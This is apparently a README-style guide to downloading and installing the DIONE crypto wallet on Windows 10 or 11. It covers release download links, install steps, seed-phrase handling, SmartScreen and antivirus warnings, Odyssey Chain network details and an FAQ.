![DIONE Wallet](assets/banner-article.png)

# Install DIONE Wallet on Windows 10 or 11

<p align="center">Windows install, first wallet, and the prompt that interrupts it</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="assets/button-windows.png" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

DIONE Wallet installs on 64-bit Windows 10 or 11 from a single signed installer. Download it from the official download page, run it, approve the Windows prompt, and the app opens on a fresh wallet you create or restore yourself. The keys are generated and encrypted on your machine, so no account, sign-up or identity check stands between the download and a working wallet.

## What you need before you start

A 64-bit Windows 10 or Windows 11 machine, 4 GB of RAM, 500 MB of free disk space and an internet connection for the first chain sync. That is the whole list - there is no account to create on a website first, no email confirmation and no KYC step, because DIONE Wallet is non-custodial and keeps everything it needs on your own disk.

Two things are worth doing before the download rather than after. Check that the machine is 64-bit, since a 32-bit Windows install will not run the build, and close any browser tab offering a "DIONE wallet setup" that is not the official download page. The most common way people lose funds with any desktop wallet is not a bug in the wallet; it is a copy installed from somewhere else.

## Download from the official source

Go to the official download page and choose the Windows build. Do not use a mirror, a search advertisement or a file sent to you in a chat message - the team never sends installers to users directly, and any message offering one is not from the project.

Before you run anything, look at what you downloaded. The download page states the installer's size per platform, so a file whose size is wildly different from that figure deserves a second look rather than a double-click. The same page describes signature verification, and the update system checks a pinned signing key before applying any update, which means a tampered installer is rejected rather than silently installed.

If you want the download checked twice over, the verification steps are the same ones used for updates; the full procedure is in [Verify a Genuine DIONE Wallet Download](https://github.com/dione-protocol/keys-and-transfers/blob/main/verify-a-genuine-dione-wallet-download.md). The short version: confirm you are on the official domain, confirm the file type is the Windows executable the page offers, and treat any "installer" that arrives as a `.zip` full of scripts as hostile.

## Run the installer

1. Open the downloaded `.exe` file.
2. Approve the Windows User Account Control prompt. Windows asks because the installer writes to Program Files; declining cancels the install.
3. Choose the install location, or accept the default.
4. Let the installer finish and leave the "launch now" option ticked, or start DIONE Wallet from the Start menu.
5. On first launch, choose whether to create a new wallet or restore an existing one.

The install takes well under a minute on an SSD. The first launch takes longer than later ones because the wallet has to reach the network and pull the chain state it needs, and that is the point at which people usually think something has gone wrong.

## Create a new wallet or import one

A new wallet is created on the device: the app generates a BIP-39 seed phrase of 12 or 24 words and encrypts it locally with AES-256-GCM and an Argon2id key derivation from your password. Write the words on paper before you fund anything, and never type them into a website, a chat window or a support form. The step-by-step is in [Create a New DIONE Wallet: First Run Walkthrough](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/create-a-new-dione-wallet.md).

If you already hold DIONE in another compliant wallet, restore from the seed phrase instead of creating a fresh wallet, so the same keys control the same addresses. That route is covered in [Import a Seed Phrase Into DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/import-a-seed-phrase-into-dione-wallet.md).

## If Windows warns about the installer

Windows SmartScreen shows a warning for any publisher it has not seen enough of, and antivirus software may quarantine a new executable on reputation rather than on evidence. Do not disable your antivirus to get past it. Allow the signed installer instead, confirm the publisher, and if your security software still refuses it, stop and verify the download before overriding anything - the article on [Verify a Genuine DIONE Wallet Download](https://github.com/dione-protocol/keys-and-transfers/blob/main/verify-a-genuine-dione-wallet-download.md) walks through that check.

A wallet that asks you to turn off protection in order to install is a wallet worth refusing. This one does not need that.

## Why the installer is larger than you expect

The desktop wallet is a full application rather than a thin shell around a website. The UI runtime, the EVM libraries it signs with and the networking stack ship together, which is why the desktop build is measured in tens of megabytes while a browser extension is measured in a few. It does not store the chain: balances are read from a node endpoint, and nothing about the size is a private copy of the ledger. Nor is any of it tracking code - the wallet sends no telemetry, carries no third-party analytics and has no backend holding your data.

If the number you see is far from the one the download page states for your platform, treat it as a signal about the file, not about the product. Re-download from the official page and compare again.

## Reach the network and check the chain

Odyssey Chain is native in DIONE Wallet, so there is no custom network to add before you can receive DIONE: chain ID 153153, the native currency DIONE, and the block explorer at odysseyscan.com for every transaction the wallet links out to. On a first run the app connects to the chain and shows the balance for the address it generated, which is zero until you receive funds.

If the app sits on "connecting" for a long time, the cause is nearly always the network path rather than the install - a VPN, a firewall rule or an offline connection. [DIONE Wallet Not Syncing: What to Check First](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-not-syncing.md) covers the check order, and the same page explains what a stale connection looks like once the wallet is running.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

DIONE Wallet updates itself through a signed auto-update: each update binary carries a signature that is checked against a pinned key before it applies, and an update that fails the check is rejected. That means the correct response to almost any misbehaviour is to make sure you are on the current release from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) rather than to work around it. The project is actively maintained and the release page is the only place an installer should come from.

## FAQ

### Does DIONE Wallet work on Windows 10?

Yes. Windows 10 and 11 are the supported Windows targets, both 64-bit. A 32-bit Windows installation is not supported by the desktop build.

### What are the system requirements?

4 GB of RAM, 500 MB of free disk space and an internet connection for chain sync. More RAM helps if you keep many tabs and other apps open alongside the wallet, but the floor above is what the build asks for.

### Do I have to disable antivirus to install it?

No. Allow the signed installer through your security software if it quarantines a new executable on reputation. Disabling protection is never the fix, and a file that only installs with protection off should not be trusted.

### Is there an account or a sign-up?

None. There is no account, no KYC, no email address and no server-side profile; the wallet exists on your machine, and the seed phrase is the only thing that can restore it elsewhere.

Installing is the first step of three: create or restore the wallet in [Create a New DIONE Wallet: First Run Walkthrough](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/create-a-new-dione-wallet.md), decide how you will back up the phrase with [Back Up a DIONE Wallet Seed Phrase Properly](https://github.com/dione-protocol/keys-and-transfers/blob/main/back-up-a-dione-wallet-seed-phrase.md), and only then move funds. Mac and Linux readers start at [DIONE Wallet Setup for macOS (Intel and Apple Silicon)](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-setup-for-macos.md) or [Run DIONE Wallet on Linux](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/run-dione-wallet-on-linux.md), and if anything in the download looks wrong, [Get Help From DIONE Wallet Support](https://github.com/dione-protocol/keys-and-transfers/blob/main/get-help-from-dione-wallet-support.md) is the route to a real answer rather than a direct message from a stranger.
